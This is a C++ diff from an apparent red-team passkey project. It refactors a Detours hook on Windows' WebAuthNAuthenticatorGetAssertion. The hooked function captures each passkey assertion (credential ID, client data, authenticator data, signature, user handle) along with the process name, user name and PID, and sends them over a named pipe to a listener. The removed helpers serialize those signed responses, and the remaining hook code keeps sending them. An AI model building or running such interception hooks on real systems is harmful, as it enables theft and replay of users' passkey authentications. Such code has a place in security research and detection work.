@@ -1,16 +1,15 @@
 #include "WebAuthnHook.h"
 
 #include "Logging.h"
+#include "NamedPipe.h"
 
 #include <detours.h>
 
-#include <string_view>
 #include <string>
 
 namespace SpecterOps::Passkeys::WebAuthnHook
 {
     constexpr const wchar_t* WebAuthnModuleName = L"webauthn.dll";
-    constexpr const wchar_t* WebAuthnHookPipeName = LR"(\\.\pipe\WebAuthnHook)";
     constexpr const char* GetAssertionExportName = "WebAuthNAuthenticatorGetAssertion";
 
     using WebAuthNAuthenticatorGetAssertionFn = HRESULT(WINAPI*)(
@@ -35,198 +34,6 @@ namespace SpecterOps::Passkeys::WebAuthnHook
     // skips them when the assertion hook was armed directly at DLL attach.
     volatile LONG g_bootstrapHooksInstalled = 0;
 
-    namespace
-    {
-        constexpr size_t SerializedAssertionJsonOverhead = 160;
-
-        std::string Base64UrlEncode(const BYTE* buffer, DWORD length)
-        {
-            if (buffer == nullptr || length == 0)
-            {
-                return {};
-            }
-
-            constexpr char Base64Alphabet[] =
-                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
-
-            std::string encoded;
-            encoded.reserve(((static_cast<size_t>(length) + 2) / 3) * 4);
-
-            for (DWORD index = 0; index < length; index += 3)
-            {
-                const DWORD remaining = length - index;
-                const BYTE byte0 = buffer[index];
-                const BYTE byte1 = remaining > 1 ? buffer[index + 1] : 0;
-                const BYTE byte2 = remaining > 2 ? buffer[index + 2] : 0;
-
-                encoded.push_back(Base64Alphabet[(byte0 >> 2) & 0x3F]);
-                encoded.push_back(Base64Alphabet[((byte0 & 0x03) << 4) | ((byte1 >> 4) & 0x0F)]);
-
-                if (remaining > 1)
-                {
-                    encoded.push_back(Base64Alphabet[((byte1 & 0x0F) << 2) | ((byte2 >> 6) & 0x03)]);
-                }
-
-                if (remaining > 2)
-                {
-                    encoded.push_back(Base64Alphabet[byte2 & 0x3F]);
-                }
-            }
-
-            return encoded;
-        }
-
-        std::string SerializeAssertionResponse(
-            const WEBAUTHN_CLIENT_DATA* clientData,
-            const WEBAUTHN_ASSERTION* assertion)
-        {
-            if (clientData == nullptr
-                || assertion == nullptr
-                || clientData->pbClientDataJSON == nullptr
-                || clientData->cbClientDataJSON == 0
-                || assertion->Credential.pbId == nullptr
-                || assertion->Credential.cbId == 0
-                || assertion->pbAuthenticatorData == nullptr
-                || assertion->cbAuthenticatorData == 0
-                || assertion->pbSignature == nullptr
-                || assertion->cbSignature == 0)
-            {
-                return {};
-            }
-
-            const std::string credentialId = Base64UrlEncode(assertion->Credential.pbId, assertion->Credential.cbId);
-            const std::string clientDataJson = Base64UrlEncode(clientData->pbClientDataJSON, clientData->cbClientDataJSON);
-            const std::string authenticatorData = Base64UrlEncode(assertion->pbAuthenticatorData, assertion->cbAuthenticatorData);
-            const std::string signature = Base64UrlEncode(assertion->pbSignature, assertion->cbSignature);
-            const std::string userHandle = Base64UrlEncode(assertion->pbUserId, assertion->cbUserId);
-
-            std::string json;
-            json.reserve(
-                credentialId.size() * 2
-                + clientDataJson.size()
-                + authenticatorData.size()
-                + signature.size()
-                + userHandle.size()
-                + SerializedAssertionJsonOverhead);
-
-            json += R"({"id":")";
-            json += credentialId;
-            json += R"(","rawId":")";
-            json += credentialId;
-            json += R"(","type":"public-key","response":{"clientDataJSON":")";
-            json += clientDataJson;
-            json += R"(","authenticatorData":")";
-            json += authenticatorData;
-            json += R"(","signature":")";
-            json += signature;
-            json += R"(","userHandle":)";
-
-            if (assertion->cbUserId == 0 || assertion->pbUserId == nullptr)
-            {
-                json += "null";
-            }
-            else
-            {
-                json += '"';
-                json += userHandle;
-                json += '"';
-            }
-
-            json += R"(},"clientExtensionResults":{}})";
-            return json;
-        }
-
-        // Each WriteFile call on a PIPE_TYPE_MESSAGE pipe creates one atomic message,
-        // so the server can read each send as a discrete, length-prefixed unit without
-        // any start/end sentinel framing.
-        bool WritePipeMessage(HANDLE pipe, std::string_view message)
-        {
-            DWORD bytesWritten = 0;
-            return ::WriteFile(
-                       pipe,
-                       message.data(),
-                       static_cast<DWORD>(message.size()),
-                       &bytesWritten,
-                       nullptr)
-                && bytesWritten == message.size();
-        }
-
-        std::string WideToUtf8(std::wstring_view wide)
-        {
-            if (wide.empty())
-            {
-                return {};
-            }
-
-            const int length = ::WideCharToMultiByte(
-                CP_UTF8, 0,
-                wide.data(), static_cast<int>(wide.size()),
-                nullptr, 0, nullptr, nullptr);
-
-            if (length <= 0)
-            {
-                return {};
-            }
-
-            std::string utf8(static_cast<size_t>(length), '\0');
-            ::WideCharToMultiByte(
-                CP_UTF8, 0,
-                wide.data(), static_cast<int>(wide.size()),
-                utf8.data(), length, nullptr, nullptr);
-            return utf8;
-        }
-
-        std::string JsonEscapeString(std::string_view str)
-        {
-            std::string result;
-            result.reserve(str.size());
-            for (const unsigned char c : str)
-            {
-                switch (c)
-                {
-                case '"':  result += "\\\""; break;
-                case '\\': result += "\\\\"; break;
-                case '\n': result += "\\n";  break;
-                case '\r': result += "\\r";  break;
-                case '\t': result += "\\t";  break;
-                default:
-                    if (c < 0x20)
-                    {
-                        char buf[8];
-                        snprintf(buf, sizeof(buf), "\\u%04X", static_cast<unsigned>(c));
-                        result += buf;
-                    }
-                    else
-                    {
-                        result += static_cast<char>(c);
-                    }
-                    break;
-                }
-            }
-            return result;
-        }
-
-        std::string BuildAssertionStartedMessage(LPCWSTR rpId)
-        {
-            const std::string rpIdEscaped      = JsonEscapeString(WideToUtf8(rpId ? rpId : L""));
-            const std::string processNameEscaped = JsonEscapeString(WideToUtf8(GetCurrentProcessName()));
-            const std::string userNameEscaped  = JsonEscapeString(WideToUtf8(GetCurrentUserName()));
-            const DWORD pid = ::GetCurrentProcessId();
-
-            std::string msg;
-            msg += R"({"type":"AssertionStarted","rpId":")";
-            msg += rpIdEscaped;
-            msg += R"(","processName":")";
-            msg += processNameEscaped;
-            msg += R"(","userName":")";
-            msg += userNameEscaped;
-            msg += R"(","pid":)";
-            msg += std::to_string(pid);
-            msg += '}';
-            return msg;
-        }
-    }
-
     HRESULT WINAPI HookWebAuthNAuthenticatorGetAssertion(
         HWND hwnd,
         LPCWSTR rpId,
@@ -235,6 +42,12 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         WEBAUTHN_ASSERTION** assertion)
     {
         AppendLog(FormatAssertionRequest(hwnd, rpId, clientData, options));
+
+        // Retrieve process context once so all pipe messages share the same values
+        // without repeating the OS lookups.
+        const std::wstring processName = GetCurrentProcessName();
+        const std::wstring userName    = GetCurrentUserName();
+        const DWORD        pid         = ::GetCurrentProcessId();
 
         // Open the pipe before calling the real API so the "started" message arrives
         // before the user is prompted.  A missing listener is silently ignored.
@@ -250,7 +63,7 @@ namespace SpecterOps::Passkeys::WebAuthnHook
 
         if (pipeOpen)
         {
-            WritePipeMessage(pipe, BuildAssertionStartedMessage(rpId));
+            WritePipeMessage(pipe, BuildAssertionStartedMessage(rpId, processName, userName, pid));
         }
 
         const HRESULT result = TrueWebAuthNAuthenticatorGetAssertion(hwnd, rpId, clientData, options, assertion);
@@ -259,18 +72,15 @@ namespace SpecterOps::Passkeys::WebAuthnHook
         {
             if (SUCCEEDED(result) && assertion != nullptr && *assertion != nullptr)
             {
-                const std::string payload = SerializeAssertionResponse(clientData, *assertion);
-                if (!payload.empty())
+                const std::string msg = BuildAssertionCompletedMessage(processName, userName, pid, clientData, *assertion);
+                if (!msg.empty())
                 {
-                    const std::string msg = R"({"type":"AssertionCompleted","payload":)" + payload + "}";
                     WritePipeMessage(pipe, msg);
                 }
             }
             else
             {
-                const std::string msg =
-                    R"({"type":"AssertionError","hresult":)" + std::to_string(static_cast<uint32_t>(result)) + "}";
-                WritePipeMessage(pipe, msg);
+                WritePipeMessage(pipe, BuildAssertionErrorMessage(rpId, processName, userName, pid, result));
             }
 
             ::FlushFileBuffers(pipe);
